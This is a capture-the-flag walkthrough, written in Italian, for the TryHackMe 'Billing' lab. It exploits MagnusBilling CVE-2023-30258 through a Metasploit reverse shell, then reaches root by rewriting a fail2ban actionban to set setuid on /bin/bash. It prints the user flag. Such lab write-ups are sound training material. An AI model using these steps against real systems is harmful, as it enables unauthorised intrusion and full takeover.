
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/billing

```
nmap -O -sN -Pn -sV -p- 10.10.97.42
```

```
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
MAC Address: 02:BF:20:50:7E:75 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/9%OT=22%CT=1%CU=43475%PV=Y%DS=1%DC=D%G=Y%M=02BF20%TM
OS:=67CD4761%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW
OS:7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4
OS:B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.50 seconds

```

```
whatweb 10.10.97.42
```
```
http://10.10.97.42 [302 Found] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.97.42], RedirectLocation[./mbilling]
http://10.10.97.42/mbilling [301 Moved Permanently] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.97.42], RedirectLocation[http://10.10.97.42/mbilling/], Title[301 Moved Permanently]
http://10.10.97.42/mbilling/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5[applicationCache], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.97.42], Script[text/javaScript,text/javascript], Title[MagnusBilling][Title element contains newline(s)!]

```
```
ExtJS 6.2.0.981
```

```
PHP
```

```
gobuster dir -u http://10.10.97.42/mbilling/ -w /usr/share/wordlists/dirb/common.txt -t50
```

niente facciamo ricerca in rete dei file comuni dell'applicazione
```
http://10.10.97.42/mbilling/README.md
```

MagnusBilling version 7.x.x 

```
msfconsole
```

```
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```

```
show options
```

```
set RHOSTS 10.10.97.42
```

```
set LHOST 10.21.9.220
```

```
set RPORT 80
```

```
set LPORT 4444
```

```
run
```

```
meterpreter > getuid
Server username: asterisk
meterpreter > pwd
/var/www/html/mbilling/lib/icepay
```

```
shell
cd /home
ls
magnus
cd magnus
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

qual'è user.txt?
```
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

```
sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

**fail2ban-client** è un'interfaccia a riga di comando che ci consente di interagire con, configurare e controllare **fail2ban-server** . Per dare una breve spiegazione, **fail2ban** è uno strumento di sicurezza che monitora i file di registro per attività sospette (come ripetuti tentativi di accesso non riusciti) e banna gli indirizzi IP incriminati aggiornando le regole del firewall.

- **`/etc/fail2ban/jail.conf`**: Questo file contiene le configurazioni di base per i vari "jail" (prigioni) che `fail2ban` utilizza per monitorare i log e applicare le regole.
- **`/etc/fail2ban/jail.local`**: Questo file è utilizzato per le configurazioni personalizzate. Se esiste, le impostazioni qui sovrascriveranno quelle di `jail.conf`.
- **`/etc/fail2ban/action.d/`**: Questa directory contiene gli script di azione che `fail2ban` esegue quando viene attivato un jail. Controlla questi file per vedere quali azioni vengono eseguite.

```
cd /etc/fail2ban/action.d/
```


Controllando i processi in esecuzione, **fail2ban-server** è in esecuzione come **root** , come previsto.

```
ps -aux | grep fail
```

Controllando lo stato del **fail2ban-server** , vediamo 8 jail attive.
```
sudo /usr/bin/fail2ban-client status
```
```
Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

Per utilizzare **fail2ban** per eseguire comandi come **root** , possiamo modificare una delle azioni definite per la jail, ad esempio l'azione da eseguire (comando da eseguire) quando si banna un IP.

Per prima cosa, recuperiamo le azioni attualmente impostate per una delle jail attive.

```
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```
```
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
```
Successivamente, modifichiamo il comando per `actionban`nell'azione `iptables-allports-ASTERISK`, che viene eseguita quando si banna un IP per la jail **asterisk-iptables** . Lo impostiamo per eseguire il nostro comando che imposta il bit **setuid** su **/bin/bash** , come segue:

```
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```

```
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```

```
sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
```

Ora possiamo bannare manualmente un indirizzo IP per la jail **asterisk-iptables** , che eseguirà il comando `actionban`definito nell'azione `iptables-allports-ASTERISK`.

```
ls -la /bin/bash
```
```
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

```
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
1
```

```
ls -la /bin/bash
```
```
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Infine, con il bit **setuid** impostato sul binario **/bin/bash** , possiamo usarlo per ottenere una shell e leggere il flag root per `/root/root.txt`completare la stanza.

```
/bin/bash -p
```

```
python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
```

```
id
```
```
root@Billing:/var/www/html/mbilling/lib/icepay# id
id
uid=0(root) gid=0(root) groups=0(root),1001(asterisk)
root@Billing:/var/www/html/mbilling/lib/icepay# cd /root
cd /root
root@Billing:/root# ls
ls
filename  passwordMysql.log  root.txt
root@Billing:/root# cat root.txt
cat root.txt
THM{xxxxxxxxxxxxxx}
```
root.txt?
```
THM{xxxxxxxxxxxxx}
```